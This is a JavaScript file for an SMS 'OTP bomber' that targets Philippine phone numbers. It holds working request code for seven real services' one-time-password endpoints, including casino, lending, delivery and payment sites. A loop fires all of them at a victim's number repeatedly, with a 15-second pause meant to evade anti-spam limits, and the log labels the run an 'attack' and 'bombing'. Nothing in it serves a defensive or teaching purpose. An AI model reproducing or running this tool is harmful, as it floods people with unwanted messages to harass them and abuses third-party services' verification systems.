// No more login, direct access to the app
window.onload = () => {
    document.getElementById('main-app-interface').style.display = 'block';
};

const apiList = [
    { name: "LAKIWIN", fire: (t) => axios.post("https://www.lakiwin.com/service/mobile/check", {"phoneNumber": "0"+t, "otpType": "LOGIN_OTP"}, {headers: {"Content-Type": "application/json;charset=UTF-8"}, timeout: 10000}) },
    { name: "S5_CASINO", fire: (t) => axios.post("https://api.s5.com/player/api/v1/otp/request", "phone_number=%2B63"+t, {headers: {"Content-Type": "application/x-www-form-urlencoded"}, timeout: 10000}) },
    { name: "FINBRO", fire: (t) => axios.post("https://api.finbro.ph/web/public/client/phone/sms-code", {"mobilePhone": {"number": "0"+t}}, {headers: {"Content-Type": "application/json;charset=UTF-8"}, timeout: 10000}) },
    { name: "BISTRO", fire: (t) => axios.post("https://bistrodelivers.com.ph/p/api/s/v2/brand_venues/bvhvXayDs85SAFAZo6g6qctA/customers/otp", {"phone_number": t, "dial_code": "+63", "phone_country": "PH", "channel": "sms"}, {headers: {"Content-Type": "application/json"}, timeout: 10000}) },
    { name: "BAYAD", fire: (t) => axios.post("https://api.online.bayad.com/api/sign-up/otp", {"mobileNumber": "+63"+t, "emailAddress": "user"+Math.floor(Math.random()*999)+"@gmail.com"}, {timeout: 5000}) },
    { name: "FASTCASH", fire: (t) => axios.post("https://api.fastcash.ph/v1/auth/otp", {"phone_number": "63"+t}, {headers: {"Content-Type": "application/json"}, timeout: 25000}) },
    { name: "CARMUDI", fire: (t) => axios.post("https://ucrf.carbay.com/sms/send-otp?countryCode=ph&langCode=en&isdCode=%2B63", {"mobile": t, "siteName": "www.carmudi.com.ph", "isdCode": "+63"}, {headers: {"Content-Type": "application/json; charset=UTF-8"}, timeout: 10000}) }
];

async function start() {
    const num = document.getElementById('num').value;
    const amount = document.getElementById('otpAmount').value;
    const log = document.getElementById('log');

    if(!num || num.length < 10) return alert("ERROR: Enter 10-digit number (9xxxxxxxxx)");

    log.innerHTML = "[+] ATTACK ENGINE ENGAGED...<br>";

    for(let i=1; i<=amount; i++) {
        log.innerHTML += "<b>[CYCLE #" + i + "]</b> Launching Payload...<br>";
        
        for (const api of apiList) {
            try {
                const res = await api.fire(num);
                log.innerHTML += "<span style='color: #0f0;'>[SUCCESS] " + api.name + " (" + res.status + ")</span><br>";
            } catch (e) {
                const status = e.response ? e.response.status : "FAIL";
                log.innerHTML += "<span style='color: #f00;'>[FAILED] " + api.name + " (" + status + ")</span><br>";
            }
            log.scrollTop = log.scrollHeight;
        }
        
        if (i < amount) {
            log.innerHTML += "<span style='color: #888;'>[!] ANTI-SPAM REST: 15s...</span><br>";
            await new Promise(r => setTimeout(r, 15000));
        }
    }
    log.innerHTML += "<b>[!] BOMBING COMPLETE.</b><br>";
}
